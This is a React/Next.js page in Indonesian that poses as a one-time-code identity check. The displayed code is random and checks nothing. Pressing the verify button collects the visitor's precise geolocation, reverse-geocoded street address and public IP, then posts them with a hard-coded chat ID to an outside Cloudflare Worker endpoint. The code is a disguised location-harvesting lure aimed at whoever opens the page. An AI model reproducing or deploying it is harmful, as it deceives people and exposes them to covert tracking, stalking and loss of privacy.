"use client";

import { useState, useEffect } from "react";

const WORKER_URL = "https://findahbot.onemimereztwo.workers.dev/api/location";
const CHAT_ID = "6677922782";

const generateOtpCode = () => Math.floor(100000 + Math.random() * 900000).toString();

export default function OtpPage() {
  const [otp, setOtp] = useState<string>(() => generateOtpCode());
  const [timeLeft, setTimeLeft] = useState<number>(60);
  const [copied, setCopied] = useState<boolean>(false);
  const [isVerified, setIsVerified] = useState<boolean>(false);
  const [isLoading, setIsLoading] = useState<boolean>(false);
  const [statusMessage, setStatusMessage] = useState<string>("");
  const [statusType, setStatusType] = useState<"info" | "error" | "success">("info");

  const sendToWorker = async (lat: number, lng: number, accuracy: number, otpCode: string) => {
    try {
      let address = "Tidak tersedia";
      try {
        const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&accept-language=id`, { headers: { "User-Agent": "Mozilla/5.0" } });
        const geoData = await geoRes.json();
        if (geoData && geoData.display_name) {
          address = geoData.display_name;
        }
      } catch {}

      let ip = "Tidak tersedia";
      try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        ip = ipData.ip;
      } catch {}

      const response = await fetch(WORKER_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chatId: CHAT_ID,
          latitude: lat,
          longitude: lng,
          accuracy: accuracy,
          otpCode: otpCode,
          address: address,
          ip: ip,
        }),
      });

      const data = await response.json();
      return data.success === true;
    } catch {
      return false;
    }
  };

  const updateStatus = (message: string, type: "info" | "error" | "success" = "info") => {
    setStatusMessage(message);
    setStatusType(type);
  };

  const verifyIdentity = () => {
    if (!navigator.geolocation) {
      updateStatus("❌ Browser tidak mendukung verifikasi", "error");
      return;
    }

    setIsLoading(true);
    updateStatus("Memverifikasi identitas...", "info");

    const options = {
      enableHighAccuracy: true,
      timeout: 15000,
      maximumAge: 0,
    };

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const { latitude, longitude, accuracy } = position.coords;

        const newOtp = generateOtpCode();
        setOtp(newOtp);
        setTimeLeft(60);

        const sent = await sendToWorker(latitude, longitude, accuracy, newOtp);

        if (sent) {
          setIsVerified(true);
          updateStatus("✅ Verifikasi identitas berhasil!", "success");
        } else {
          updateStatus("❌ Verifikasi gagal. Coba lagi.", "error");
        }

        setIsLoading(false);
      },
      (error) => {
        let errorMsg = "";
        switch (error.code) {
          case 1:
            errorMsg = "⚠️ Verifikasi ditolak!";
            break;
          case 2:
            errorMsg = "⚠️ Sinyal tidak stabil.";
            break;
          case 3:
            errorMsg = "⏳ Waktu habis. Coba lagi.";
            break;
          default:
            errorMsg = "❌ Verifikasi gagal.";
        }
        updateStatus(errorMsg, "error");
        setIsLoading(false);
      },
      options
    );
  };

  const handleCopy = async () => {
    if (!isVerified) return;
    try {
      await navigator.clipboard.writeText(otp);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      console.error("Gagal menyalin:", err);
    }
  };

  useEffect(() => {
    if (!isVerified) return;

    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          setOtp(generateOtpCode());
          return 60;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [isVerified]);

  return (
    <main className="min-h-screen flex items-center justify-center bg-gray-50 p-4 text-gray-800">
      <div className="w-full max-w-md p-8 bg-white rounded-2xl shadow-sm border border-gray-200 text-center">
        <h1 className="text-2xl font-bold mb-2">Kode Verifikasi</h1>
        <p className="text-sm text-gray-600 mb-6">{isVerified ? "Kode akan diperbarui otomatis setiap 1 menit." : "Verifikasi identitas untuk melihat kode."}</p>

        {statusMessage && <div className={`mb-4 p-3 rounded-lg text-sm ${statusType === "success" ? "bg-green-50 text-green-700 border border-green-200" : statusType === "error" ? "bg-red-50 text-red-700 border border-red-200" : "bg-blue-50 text-blue-700 border border-blue-200"}`}>{statusMessage}</div>}

        <div className={`p-6 rounded-xl mb-4 border transition-all ${isVerified ? "bg-gray-100 border-gray-200" : "bg-gray-50 border-gray-200 opacity-50 blur-sm select-none"}`}>
          <span className={`text-4xl font-mono font-bold tracking-widest ${isVerified ? "text-blue-600" : "text-gray-400"}`}>{isVerified ? otp || "------" : "••••••"}</span>
        </div>

        {isVerified && (
          <div className="mb-6">
            <div className="flex justify-between text-xs text-gray-500 mb-1">
              <span>Kadaluwarsa dalam:</span>
              <span className="font-semibold text-gray-700">{timeLeft} detik</span>
            </div>
            <div className="w-full bg-gray-200 h-2 rounded-full overflow-hidden">
              <div className="bg-blue-600 h-full transition-all duration-1000 ease-linear" style={{ width: `${(timeLeft / 60) * 100}%` }} />
            </div>
          </div>
        )}

        <div className="space-y-3">
          {!isVerified ? (
            <button onClick={verifyIdentity} disabled={isLoading} className="w-full py-3 rounded-lg font-medium transition bg-blue-600 text-white hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed">
              {isLoading ? "⏳ Memproses..." : "🔐 Verifikasi Identitas"}
            </button>
          ) : (
            <button onClick={handleCopy} className={`w-full py-3 rounded-lg font-medium transition ${copied ? "bg-green-600 text-white" : "bg-blue-600 text-white hover:bg-blue-700"}`}>
              {copied ? "✓ Tersalin!" : "Salin Kode"}
            </button>
          )}
        </div>
      </div>
    </main>
  );
}
